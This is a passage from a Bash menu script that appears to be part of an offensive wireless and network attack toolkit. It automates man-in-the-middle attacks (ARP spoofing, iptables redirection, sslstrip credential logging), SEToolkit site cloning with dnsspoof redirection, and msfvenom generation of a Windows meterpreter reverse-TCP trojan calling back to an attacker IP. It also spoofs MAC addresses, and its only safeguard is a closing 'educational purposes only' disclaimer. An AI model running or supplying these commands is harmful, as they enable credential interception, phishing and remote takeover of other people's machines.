			echo -e "$PAKTGB"
			read
			clear
			exec bash "$0"
		else
			clear
			echo -e "Moving into new terminal..."
			sleep 1
			gnome-terminal --geometry 80x25+9999+0 -e lh3
			sleep 1
			exec bash "$0"
		fi
	elif [ "$YORNAA" = "12" ]
	then
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			echo -e "Monitor mode is not enabled."
			echo -e "Select 'start' or '2' to enable it"
			echo -e "$PAKTGB"
			read
			clear
			exec bash "$0"
		else
			echo -e "Moving into new terminal..."
			sleep 1
			gnome-terminal --geometry 80x25+9999+0 -e lh4
			sleep 1
			exec bash "$0"
		fi
	elif [ "$YORNAA" = "13" ]
	then
		clear
		echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
		echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
		echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
		read MITMATT
		clear
		if [ "$MITMATT" = "1" ]
		then
			while true
			do
			clear
			echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
			echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
			echo -e ""$YS" 2"$CE") Set iptables"
			echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
			echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
			echo -e ""$YS"00"$CE") Main menu"
			echo -e ""$YS" 0"$CE") EXIT"
			echo -e "Choose: "
			read -e MITMCH
			if [ "$MITMCH" = "1" ]
			then
				echo "1" > /proc/sys/net/ipv4/ip_forward
				echo -e "Done."
				sleep 1
			elif [ "$MITMCH" = "d1" ]
			then
				echo "0" > /proc/sys/net/ipv4/ip_forward
				echo -e "Done."
				sleep 1
			elif [ "$MITMCH" = "2" ]
			then
				clear
				echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
				read PORTTCP
				if [ "$PORTTCP" = "" ]
				then
					PORTTCP="8080"
				fi
							clear
				echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
				read PORTUDP
				if [ "$PORTUDP" = "" ]
				then
					PORTUDP="40"
				fi
				iptables --flush
				iptables --flush -t nat
				iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
				iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
				echo -e "Done."
				sleep 1
			elif [ "$MITMCH" = "3" ]
			then
				clear
				route -n
				echo -e ""
				echo -e ""
				echo -e "Enter your gateway(prefer eth0 gateway):"
				read GATENM
				echo -e ""
				echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
				read GATEINT
				if [ "$GATEINT" = "" ]
				then
					GATEINT="eth0"
				fi	
				while true
				do	
				clear
				nmap -sP "$GATENM"/24
				echo -e ""
				echo -e ""
				echo -e "Enter your target IP:"
				read TARGIP
				if [ "$TARGIP" = "r" ]
				then
					continue
				else
					break
				fi
				done
				echo -e ""
				echo -e "$PAKTC"
				read
				export GATENM
				export GATEINT
				export TARGIP
				export PORTTCP
				export PORTUDP
				cd "$LPATH"/ls
				gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
				gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
				gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
				sslstrip -l $PORTTCP -w /root/sslstrip.log
				echo -e "$PAKTGB"
				read
				continue
			elif [ "$MITMCH" = "33" ]
			then
				clear
				echo -e "Enter your gateway(prefer eth0 gateway):"
				read GATENM
				echo -e ""
				echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
				read GATEINT
				if [ "$GATEINT" = "" ]
				then
					GATEINT="eth0"
				fi
				clear
				echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
				read TARGIP
				echo -e ""
				echo -e "$PAKTC"
				read
				export GATENM
				export GATEINT
				export TARGIP
				export PORTTCP
				export PORTUDP
				cd /root/lscript/ls
				gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
				gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
				gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
				sslstrip -l $PORTTCP -w /root/sslstrip.log
				echo -e "$PAKTGB"
				read
				continue
			elif [ "$MITMCH" = "4" ]
			then
				leafpad /root/sslstrip.log
			#~ elif [ "$MITMCH" = "44" ]
			#~ then
			elif [ "$MITMCH" = "00" ]
			then
				clear
				exec bash "$0"
			elif [ "$MITMCH" = "0" ]
			then
				clear
				exit
			fi
			done
		elif [ "$MITMATT" = "2" ]
		then
			while true
			do
			clear
			echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
			echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward"
			echo -e ""$YS" 2"$CE") Scan and select target IP         "$YS"22"$CE") I have scaned"
			echo -e ""$YS" 3"$CE") Start ARPspoofing"
			#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
			echo -e ""$YS" 4"$CE") Start SEToolkit"
			echo -e ""$YS" 5"$CE") Start DNSspoofing"
			echo -e ""$YS"00"$CE") Main menu"
			echo -e ""$YS" 0"$CE") EXIT"
			echo -e "Choose: "
			read -e MITMSET
			clear
			if [ "$MITMSET" = "1" ]
			then
				echo "1" > /proc/sys/net/ipv4/ip_forward
				echo -e "Done."
				sleep 1
			elif [ "$MITMSET" = "d1" ]
			then
				echo "0" > /proc/sys/net/ipv4/ip_forward
				echo -e "Done."
				sleep 1
			elif [ "$MITMSET" = "2" ]
			then
				route -n
				echo -e ""
				echo -e ""
				echo -e "Enter your gateway:"
				read GATENM
				echo -e ""
				echo -e "Enter the gateway's interface(etc: wlan0):"
				read GATEINT
				#~ if [ "$GATEINT" = "" ]
				#~ then
					#~ GATEINT="eth0"
				#~ fi
				while true
				do		
				clear
				nmap -sP "$GATENM"/24
				echo -e ""
				echo -e ""
				echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
				read TARGIP
				if [ "$TARGIP" = "r" ]
				then
					continue
				else
					break
				fi
				done
			elif [ "$MITMSET" = "22" ]
			then
				echo -e "Enter your gateway:"
				read GATENM
				echo -e ""
				echo -e "Enter the gateway's interface(etc: wlan0):"
				read GATEINT
				#~ if [ "$GATEINT" = "" ]
				#~ then
					#~ GATEINT="eth0"
				#~ fi
				clear
				echo -e "Enter your target IP:"
				read TARGIP
			elif [ "$MITMSET" = "3" ]
			then
				export PAKTC
				export GATEINT
				export TARGIP
				export GATENM
				cd "$LPATH"/ls
				gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
				gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
			#~ elif [ "$MITMSET" = "4" ]
			#~ then
				#~ service apache2 start
			#~ elif [ "$MITMSET" = "d4" ]
			#~ then
				#~ service apache2 stop
			elif [ "$MITMSET" = "4" ]
			then
				echo -e "Clone a website to one of the following IP(s):"
				ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
				echo -e "$PAKTC"
				read
				gnome-terminal --geometry 66x40+999999+0 -e setoolkit
			elif [ "$MITMSET" = "5" ]
			then
				echo -e "Making you a hosts.txt file"
				echo -e ""
				echo -e "Enter your IP address that you started the server:"
				echo -e "One of this/these:"
				ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
				read -e SERVIP
				echo -e "Enter the interface of that IP(etc: wlan0):"
				read -e INTIP
				if [ -f ""$LPATH"/HOSTS/hosts.txt" ]
				then
					rm "$LPATH"/HOSTS/hosts.txt
				fi
				mkdir "$LPATH"/HOSTS
				clear
				while true
				do
				clear
				echo -e "Enter the URL you want to redirect your IP from(etc: thisis.myfakesite.com):"
				read -e URL
				echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
				sleep 0.2
				clear
				echo -e "Add another one as well?"$YNYES""
				read -e ANOTHERHOST
				if [ "$ANOTHERHOST" = "n" ]
				then
					break
				fi
				done
				clear
				echo -e "Starting dnsspoof..."
				echo -e "$PAKTC"
				read
				export INTIP
				xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
			elif [ "$MITMSET" = "00" ]
			then
				clear
				exec bash "$0"
			elif [ "$MITMSET" = "0" ]
			then
				clear
				exit
			fi
			done
		elif [ "$MITMATT" = "00" ]
		then
			clear
			exec bash "$0"
		elif [ "$MITMATT" = "0" ]
		then
			clear
			exit
		fi
	elif [ "$YORNAA" = "14" ]
	then
		while true
		do
		clear
		echo -e "---------------------------"$RS"METASPLOIT"$CE"----------------------------"
		echo -e ""$YS" 1"$CE") Create payload"
		#~ echo -e ""$YS" 2"$CE") Create payload with zirikatu"
		echo -e ""$YS" 2"$CE") Start msfconsole"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e ""$YS" 0"$CE") EXIT"
		echo -e "Choose: "
		read -e METASP
		if [ "$METASP" = "1" ]
		then
			clear
			echo -e "Enter the attacker's IP: "
			read ATIP
			echo -e ""
			echo -e "Enter the attacker's PORT: "
			read ATPORT
			echo -e ""
			echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
			read TARCH
			echo -e "Enter the output path(etc "$YS"/root/Desktop/trojan.exe"$CE"): "
			read ATEXE
			clear
			echo -e "Generating"
			sleep 0.1
			echo .
			sleep 0.1
			echo .
			sleep 0.1
			echo .
			sleep 0.1
			echo .
			sleep 0.1
			echo .
			sleep 0.1
			echo .
			msfvenom -p windows/meterpreter/reverse_tcp   --platform windows -a $TARCH -f exe LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXE"
			echo -e "Done."
			echo -e ""
			echo -e "$PAKTC"
			read
		elif [ "$METASP" = "z" ]
		then
			clear
			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
			sleep 3
			echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
			read MUSTBEYES
			if [ "$MUSTBEYES" = "YES" ] 
			then 
				clear
				cd /root/zirikatu
				./zirikatu.sh
			fi
		elif [ "$METASP" = "2" ]
		then
			clear
			msfconsole
		elif [ "$METASP" = "00" ]
		then
			clear
			exec bash "$0"
		elif [ "$METASP" = "0" ]
		then
			clear
			exit
		fi
		done
	elif [ "$YORNAA" = "exit" ]
	then
		exit
	elif [ "$YORNAA" = "update" ]
	then
		#----------update-check-----------
		clear
		echo -e "Checking for updates..."
		TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
		if [ "$TESTINTERNETCONNECTION" != "" ]
		then
			VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
			if [ "$VERSION" != "$VER" ]
			then
			clear
			echo -e "There is an update available."
			echo -e "Current version: $VERSION"
			echo -e "Updated version: $VER"
			echo -e "$PAKTC"
			read
			clear
			echo -e "Do you want to update?"$YNONLY": "
			read UPDATEYN
			if [ "$UPDATEYN" = "y" ]
			then
				clear
				echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
				sleep 2
				mkdir /root/lscriptold
				echo -e ""
				echo -e "Moving lscript to lscriptold"
				sleep 2
				mv /root/lscript /root/lscriptold
				echo -e "Cloning the latest github version to new /root/lscript"
				sleep 2
				cd
				git clone https://github.com/arismelachroinos/lscript.git
				cd "$LPATH"
				chmod +x install.sh
				clear
				echo -e "Ok , everything seems to be fine by now."
				sleep 1
				echo -e "A new terminal will open, and then the new install.sh will run to update the lscript.I will close."
				echo -e ""
				sleep 4
				echo -e "$PAKTC"
				read
				cd "$LPATH"
				gnome-terminal -e ./install.sh
				clear 
				if [ -d /root/lscriptold/ks ]
				then
					echo -e "Copying old shortcuts"
					cp /root/lscriptold/ks "$LPATH"
					sleep 1
					echo -e "Done."
					sleep 1
					clear
				fi
				sleep 1
				echo -e ""
				echo -e "Removing old lscript"
				rm -rf /root/lscriptold
				echo -e "Exiting..."
				sleep 1
				exit
			else 
				clear
				echo -e "You didnt select "y" so you go back..."
				sleep 3
				exec bash "$0"
			fi
			else
			echo -e "There is no update available"
			sleep 1
			echo -e "Installed version: $VERSION"
			sleep 1
			echo -e "Github version:    $VER"
			sleep 1
			echo -e "$PAKTGB"
			read		
			exec bash "$0"
			fi
		else
			clear
			echo -e "There is no connection."
			sleep 1
			echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
			echo -e ""
			echo -e "$PAKTGB"
			read
			exec bash "$0"
		fi
	elif [ "$YORNAA" = "if" ]
	then
		ifconfig
	elif [ "$YORNAA" = "changelog" ]
	then
		clear
		cat "$LPATH"/Changel*
		echo -e "$PAKTC"
		read
		clear
	elif [ "$YORNAA" = "" ]
	then
		clear
		exec bash "$0"
	elif [ "$YORNAA" = "errors" ]
	then
		#---------------------------------------------------------------------------------------------------------------------------
		echo -e "-----------------------------"$RS"ERRORS"$CE"------------------------------"
		echo -e ""$YS" 1"$CE") Fix no audio issue"
		echo -e ""$YS" 2"$CE") No output in wash"
		echo -e ""$YS" 3"$CE") No full screen"
		echo -e ""$YS"back"$CE") Go back"
		echo -e ""$YS" 0"$CE") EXIT"
		echo -e " Choose: "
		read ERRS
		if [ "$ERRS" = "1" ]
		then
			clear
			echo -e "Trying to get you some audio..."
			sleep 2
			clear
			echo -e "Press "$YS"y"$CE" if/when prompted"
			sleep 3
			clear
			echo -e "Installing pulseaudio......."
			sleep 1
			apt-get pulseaudio
			echo -e "Enabling pulseaudio......."
			sleep 1
			systemctl --user enable pulseaudio && systemctl --user start pulseaudio
			clear
			echo -e "Done!"
			sleep 1
			clear
			echo -e "I mean...Try to see if you have audio."
			sleep 3
			echo -e " "
			echo -e "That's all i can do :/"
			sleep 2
			echo -e " "
			echo -e "If it wasn't fix , then try rebooting"
		elif [ "$ERRS" = "2" ]
		then
			clear
			echo -e "Ok...Lets try to fix this..."
			sleep 1
			mkdir /etc/reaver
			echo -e "It seems to be fixed."
			echo -e "Enter you interface"
			read INTWASH
			echo -e "Press "$YS"many key"$CE" to test wash"
			echo -e "Also try "wash -i wlan0mon -a" to display all networks"
			wash -i $INTWASH
		elif [ "$ERRS" = "3" ]
		then
			apt-get install open-vm-tools-desktop fuse
			echo -e "Restart your vistual machine..."
			sleep 2
			echo -e "$PAKTGB"
			read
		elif [ "$ERRS" = "0" ]
		then
			clear
			echo -e "EXITING"
			sleep 1
			clear
			exit
		elif [ "$ERRS" = "00" ]
		then
			clear
			exec bash "$0"
		else
			clear
			echo -e "Not an valid option...."
			exec bash "$0"
		fi
		#---------------------------------------------------------------------------------------------------------------------------
	elif [ "$YORNAA" = "start" ]
	then
		#~ echo -e "Changing MAC of eth0 to 00:11:22:33:44:55..."
		#~ ifconfig eth0 down
		#~ macchanger -m 00:11:22:33:44:55 eth0 | grep "New MAC:"
		#~ ifconfig eth0 up
		echo -e "Enabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		ifconfig $WLANN up
		echo -e "$WLANN enabled"
		#~ echo -e "Changing MAC of $WLANN to 00:11:22:33:44:55..."
		#~ ifconfig $WLANN down
		#~ macchanger -m 00:11:22:33:44:55 $WLANN | grep "New MAC:"
		#~ ifconfig $WLANN up
		echo -e "Enabling $WLANNM..."
		echo -e "Killing services..."
		airmon-ng check kill
		echo -e "Done."
		echo -e "Starting monitor mode..."
		airmon-ng start $WLANN
		echo -e "Done."
		echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
		ifconfig $WLANNM down
		macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:"
		ifconfig $WLANNM up
		echo -e "Done."
		echo -e "SUCCESS!"
#----------
		elif [ "$YORNAA" = "stop" ]
		then
		echo -e "Changing mac address of $WLANNM to the original one..."
		ifconfig $WLANNM down
		macchanger -p $WLANNM
		ifconfig $WLANNM up
		echo -e "Disabling $WLANNM..."
		echo -e "Stopping monitor mode..."
		airmon-ng stop $WLANNM
		echo -e "ok..."
		echo -e "Starting network-manager service..."
		service network-manager start
		echo -e "ok..."
		#~ echo -e "$WLANN is probably down.Bring it up?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "
		#~ read -e YORN
		#~ if [ "$YORN" = "y" ]  
		#~ then
			#~ #rfkill unblock wifi
			#~ #rfkill unblock all
			#~ ifconfig $WLANN up
			#~ echo -e "$WLANN is now up."
		#~ fi
		echo -e "Changing mac address of $WLANN to the original one..."
		ifconfig $WLANN down
		macchanger -p $WLANN
		ifconfig $WLANN up
		echo -e "Changing mac address of eth0 to the original one..."
		ifconfig eth0 down
		macchanger -p eth0
		ifconfig eth0 up
		echo -e "Done."
		echo -e "SUCCESS!"
		elif [ "$YORNAA" = "exit" ]
		then
			exit
		#~ else
			#~ clear
			#~ echo -e "Wrong choice"
			#~ $YORNAA
			#~ sleep 0.3
			#~ clear
			#~ exec bash "$0"
		fi
echo -e "$PAKTGB"
read
exec bash "$0"
#~ echo -e "Choose again?"$YNYES": "
#~ read -e YORNLAST
#~ if [ -z "$YORNLAST" ]
#~ then
	#~ clear
	#~ exec bash "$0"
#~ elif [ "$YORNLAST" = "y" ]
#~ then
	#~ clear
	#~ exec bash "$0"
#~ else 
	#~ clear
	#~ exit
#~ fi
else
	echo -e "You need to accept the terms."
	sleep 1
	echo -e "$PAKTC"
	read
	clear
	echo -e "This tool is only for educational purposes only."
	sleep 2
	echo -e "Use this tool only on your own network and never without permission."
	sleep 2
	echo -e "I am not responsible for anything you do with this tool."
	sleep 2
	echo -e "Will you use this tool only on your own network and only with your own responsibility?("$YS"YES"$CE"/"$YS"NO"$CE"): "
	read YESORNO
	if [ "$YESORNO" = "YES" ]
	then 
		echo "You have agreed the terms and you use this tool with your own responsibility." > "$LPATH"/IAGREE.txt
		sleep 1
		clear
	fi
	exec bash "$0"
fi
